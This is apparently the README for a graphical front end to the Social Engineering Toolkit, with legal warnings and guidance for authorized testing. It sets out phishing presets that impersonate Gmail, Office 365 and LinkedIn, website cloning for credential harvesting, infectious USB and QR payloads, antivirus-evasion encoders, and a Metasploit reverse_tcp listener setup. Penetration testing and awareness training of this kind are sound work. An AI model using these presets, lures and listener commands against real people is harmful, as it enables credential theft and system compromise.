# Social Engineering Toolkit (SET) GUI

A professional graphical user interface for the Social Engineering Toolkit (SET), one of the most powerful social engineering frameworks.

## ⚠️ CRITICAL LEGAL WARNING

**THIS TOOL IS EXTREMELY DANGEROUS AND MUST ONLY BE USED LEGALLY**

Social engineering attacks are **SERIOUS CRIMES** when performed without authorization. This includes:
- Phishing attacks (can result in federal charges)
- Website cloning and credential harvesting
- Unauthorized email spoofing
- Malware distribution
- Identity fraud

### Legal Use Cases ONLY:
- **Authorized penetration testing** with written permission
- **Security awareness training** in controlled environments
- **Red team exercises** for organizations you work for
- **Educational demonstrations** with explicit consent

**Unauthorized use can result in:**
- Federal criminal charges
- State criminal charges
- Civil lawsuits
- Prison sentences
- Massive fines
- Permanent criminal record

**YOU HAVE BEEN WARNED. USE RESPONSIBLY.**

## Features

- 🎯 **8 Attack Vectors**:
  - Spear-Phishing Attack
  - Website Attack Vectors
  - Infectious Media Generator
  - QR Code Generator
  - Mass Mailer Attack
  - SMS Spoofing
  - Wireless Access Point
  - Payload & Listener

- 🎨 **Modern GUI Interface**:
  - Dynamic configuration panels
  - Quick attack presets
  - Real-time output logging
  - Report generation

- ⚙️ **Advanced Configuration**:
  - Multiple payload types
  - Email template selection
  - Custom SMTP servers
  - Payload encoding options
  - USB HID attack support

- 📋 **Quick Presets**:
  - Gmail phishing
  - Office 365 phishing
  - LinkedIn phishing
  - Credential harvester
  - USB payload
  - Android payload

## Prerequisites

### Install Social Engineering Toolkit

On Kali Linux:
```bash
sudo apt-get update
sudo apt-get install set -y
```

From source (for latest version):
```bash
git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
cd set
sudo python setup.py install
```

Verify installation:
```bash
setoolkit --version
```

### Python Requirements

Python 3.6+ with tkinter:
```bash
python3 --version
sudo apt-get install python3-tk
```

## Installation

1. Download the GUI:
```bash
wget https://your-server/setoolkit_gui.py
# or copy the file directly
```

2. Make it executable:
```bash
chmod +x setoolkit_gui.py
```

## Usage

### Launch the GUI

```bash
python3 setoolkit_gui.py
```

or

```bash
./setoolkit_gui.py
```

### Important Notes

**SET is highly interactive** - this GUI provides:
- Configuration assistance
- Parameter organization
- Attack script generation
- Quick presets

For full SET functionality, the GUI will:
1. Generate configuration based on your inputs
2. Create an attack script
3. Optionally launch SET in a terminal for you

## Attack Vectors

### 1. Spear-Phishing Attack

Send targeted phishing emails with malicious payloads.

**Configuration:**
- Target email address
- From email address
- Email subject
- SMTP server and port
- Email template
- Payload type
- Local IP (for callback)
- Local port

**Example:**
```
Target: victim@company.com
From: it-support@company.com
Subject: Urgent: Security Update Required
Template: Microsoft Office
Payload: Meterpreter
LHOST: 192.168.1.100
LPORT: 443
```

**Use Cases:**
- Testing employee security awareness
- Authorized red team assessments
- Security training demonstrations

### 2. Website Attack Vectors

Clone websites and harvest credentials.

**Sub-attacks:**
- **Credential Harvester**: Clone a website and capture login credentials
- **Tabnabbing**: Change tabs to phishing pages
- **Web Jacking**: Hijack web sessions

**Configuration:**
- URL to clone (e.g., https://login.microsoft.com)
- Local IP (hosting server)
- Local port

**Example:**
```
Clone URL: https://mail.google.com
LHOST: 192.168.1.100
LPORT: 80
```

### 3. Infectious Media Generator

Create malicious USB drives or CDs with autorun capabilities.

**Configuration:**
- Payload type
- File format
- Encoding method
- Target platform

**Output:**
- Autorun.inf file
- Malicious payload
- Instructions for deployment

### 4. QR Code Generator

Generate malicious QR codes that redirect to phishing sites or download payloads.

**Configuration:**
- QR code data/URL
- Output format
- Size specifications

**Example:**
```
QR Data: http://192.168.1.100/payload.apk
```

### 5. Mass Mailer Attack

Send phishing emails to multiple targets.

**Configuration:**
- Target email list (file)
- From email address
- Email subject
- Email template
- SMTP configuration

**Features:**
- Bulk email sending
- Template customization
- Attachment support

### 6. SMS Spoofing Attack

Send spoofed SMS messages.

**Configuration:**
- Target phone number
- Spoofed sender
- Message content

**Note:** Requires SMS gateway access or Twilio API.

### 7. Wireless Access Point

Create a rogue WiFi access point for man-in-the-middle attacks.

**Configuration:**
- SSID (network name)
- Capture method
- Credential harvesting

**Requirements:**
- Wireless adapter supporting monitor mode
- Root/sudo privileges

### 8. Payload & Listener

Generate standalone payloads and setup listeners.

**Payload Types:**
- **Meterpreter**: Full-featured backdoor
- **Shell**: Simple reverse shell
- **VNC**: Remote desktop access
- **PowerShell**: Windows PowerShell payload
- **Python**: Cross-platform Python payload

**Platforms:**
- Windows (EXE, DLL, MSI)
- Linux (ELF, Shell)
- macOS (Macho)
- Android (APK)
- iOS (Restricted)

## Quick Presets

### Gmail Phishing
Pre-configured for Gmail credential harvesting:
- From: noreply@accounts-google.com
- Subject: Security Alert: Unusual Activity Detected
- Template: Google Docs style

### Office 365 Phishing
Pre-configured for Office 365 attacks:
- From: noreply@microsoft.com
- Subject: Action Required: Verify Your Account
- Template: Microsoft Office style

### LinkedIn Phishing
Pre-configured for LinkedIn credential theft:
- From: notifications@linkedin.com
- Subject: You have new connection requests
- Template: LinkedIn style

### Credential Harvester
Quick setup for website cloning and credential capture.

### USB Payload
Pre-configured for USB HID attacks using Teensy/Arduino.

### Android Payload
Pre-configured for Android APK payload generation.

## Configuration Details

### Network Settings

**LHOST (Local Host):**
- Your attacking machine's IP address
- Used for callback connections
- Can be auto-detected

**LPORT (Local Port):**
- Port for incoming connections
- Common: 443, 4444, 8080
- Ensure firewall allows

### SMTP Configuration

For email-based attacks:

**Using Gmail:**
```
SMTP Server: smtp.gmail.com
Port: 587 (TLS) or 465 (SSL)
Note: Requires app-specific password
```

**Using SendGrid:**
```
SMTP Server: smtp.sendgrid.net
Port: 587
Note: Requires API key
```

**Using Local Server:**
```
SMTP Server: localhost
Port: 25
Note: Requires local SMTP service
```

### Payload Encoding

Encoding helps evade antivirus detection:

- **None**: No encoding (fastest, least evasive)
- **Shikata Ga Nai**: Polymorphic XOR encoder
- **Fnstenv Mov**: FPU register encoder
- **Jmp Call Additive**: Polymorphic encoder
- **NonAlpha**: Alphanumeric encoder
- **Unicode Mixed**: Unicode encoder

**Note:** Multiple encoding iterations increase evasion but also increase payload size.

## Attack Workflows

### Basic Phishing Campaign

1. **Reconnaissance:**
   - Gather target email addresses
   - Identify organization's email templates
   - Research common employee names

2. **Configuration:**
   - Select "Spear-Phishing Attack"
   - Set target email
   - Choose appropriate template
   - Configure SMTP server
   - Set payload (Meterpreter recommended)

3. **Execution:**
   - Review configuration
   - Launch attack
   - Monitor listener for callbacks

4. **Post-Exploitation:**
   - Interact with compromised systems
   - Gather evidence
   - Document findings
   - Report to client

### Credential Harvesting

1. **Target Selection:**
   - Identify website to clone (e.g., company portal)
   - Note login page URL

2. **Configuration:**
   - Select "Website Attack Vectors"
   - Enter clone URL
   - Set LHOST and LPORT

3. **Deployment:**
   - Launch attack
   - Send phishing email with link
   - Monitor for credential submissions

4. **Analysis:**
   - Review captured credentials
   - Test validity
   - Document for report

### USB Payload Deployment

1. **Payload Creation:**
   - Select "Infectious Media Generator"
   - Choose payload type
   - Configure callback settings

2. **Physical Deployment:**
   - Copy files to USB drive
   - Label appropriately for social engineering
   - Deploy in target environment

3. **Monitoring:**
   - Setup listener
   - Wait for callback
   - Maintain access

## Security Best Practices

### Before Testing

1. **Get Written Authorization:**
   - Signed contract or agreement
   - Clear scope definition
   - Defined testing windows
   - Contact information

2. **Document Everything:**
   - Test plan
   - Attack methodology
   - Timestamps
   - Screenshots

3. **Prepare Legal Protection:**
   - Liability insurance
   - Legal counsel contact
   - Emergency contacts

### During Testing

1. **Stay Within Scope:**
   - Only test authorized systems
   - Follow time restrictions
   - Respect data boundaries

2. **Monitor Impact:**
   - Watch for service disruption
   - Pause if issues occur
   - Maintain communication

3. **Secure Captured Data:**
   - Encrypt credentials
   - Secure storage
   - Limited access

### After Testing

1. **Immediate Actions:**
   - Remove all backdoors
   - Delete malicious payloads
   - Close listening ports

2. **Reporting:**
   - Detailed findings report
   - Remediation recommendations
   - Executive summary
   - Technical appendix

3. **Data Destruction:**
   - Securely delete captured data
   - Verify removal
   - Document destruction

## Legal Frameworks

### Computer Fraud and Abuse Act (CFAA)
- US federal law
- Prohibits unauthorized access
- Penalties: fines + prison

### Wire Fraud Act
- Covers phishing and email fraud
- Federal crime
- Up to 20 years imprisonment

### State Laws
- Vary by jurisdiction
- Often stricter than federal
- Research local laws

### International Laws
- GDPR (Europe)
- Computer Misuse Act (UK)
- Criminal Code (Canada)
- Varies by country

## Troubleshooting

### SET Won't Launch
```bash
# Check installation
which setoolkit

# Reinstall if needed
sudo apt-get install --reinstall set

# Or from source
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
sudo python setup.py install
```

### Email Not Sending
```bash
# Test SMTP connection
telnet smtp.gmail.com 587

# Check credentials
# Verify firewall rules
# Try different SMTP server
```

### Payload Not Connecting
```bash
# Verify LHOST is correct
ip addr show

# Check LPORT is open
sudo netstat -tulpn | grep LPORT

# Verify firewall allows
sudo ufw allow LPORT
```

### Permission Denied
```bash
# Run with sudo
sudo python3 setoolkit_gui.py

# Or fix permissions
chmod +x setoolkit_gui.py
```

## Advanced Features

### Custom Email Templates

Create custom templates in:
```
/usr/share/set/src/templates/
```

### Custom Payloads

Add custom payloads:
```
/usr/share/set/src/payloads/
```

### Integration with Metasploit

SET integrates seamlessly with Metasploit:
```bash
# Start Metasploit listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 443
exploit
```

### Automation Scripts

Create automation scripts for repeated tasks:
```bash
#!/bin/bash
# Automated SET attack

# Configuration
LHOST="192.168.1.100"
TARGET="victim@company.com"

# Launch attack (example)
echo "Launching automated attack..."
# Add SET commands here
```

## Report Generation

The GUI includes built-in report generation:

**Reports Include:**
- Attack configuration
- Timestamps
- Output logs
- Captured data summary

**Report Location:**
```
/tmp/set_report_TIMESTAMP.txt
```

## Ethics and Responsible Disclosure

### Ethical Guidelines

1. **Only test with permission**
2. **Minimize harm and disruption**
3. **Protect captured data**
4. **Report vulnerabilities responsibly**
5. **Educate, don't exploit**

### Responsible Disclosure

When finding vulnerabilities:
1. Contact organization privately
2. Provide detailed information
3. Allow reasonable time to fix
4. Coordinate public disclosure
5. Credit researchers appropriately

## Resources

### Official Documentation
- SET GitHub: https://github.com/trustedsec/social-engineer-toolkit
- SET Wiki: https://github.com/trustedsec/social-engineer-toolkit/wiki

### Learning Resources
- SANS Security Awareness: https://www.sans.org/security-awareness-training/
- Social Engineering Framework: https://www.social-engineer.org/framework/
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/

### Legal Resources
- EFF: https://www.eff.org/
- CFAA Information: https://www.justice.gov/criminal-ccips

## Contributing

Contributions welcome! Please:
- Test thoroughly
- Document changes
- Follow coding standards
- Submit pull requests

## Support

For issues:
- Check SET documentation
- Review error logs
- Consult community forums
- File GitHub issues

## License

MIT License - See LICENSE file

## Disclaimer

**CRITICAL DISCLAIMER:**

This tool is provided for **EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**.

The creators, contributors, and distributors of this software:
- Are NOT responsible for ANY illegal use
- Do NOT condone unauthorized hacking
- Do NOT provide legal advice
- STRONGLY URGE legal and ethical use only

Users are **SOLELY RESPONSIBLE** for:
- Obtaining proper authorization
- Complying with all laws
- Any consequences of misuse
- Damages caused by the tool

**By using this tool, you agree to use it legally and ethically.**

---

**Remember: Just because you CAN do something doesn't mean you SHOULD. Be ethical. Be legal. Be responsible.**
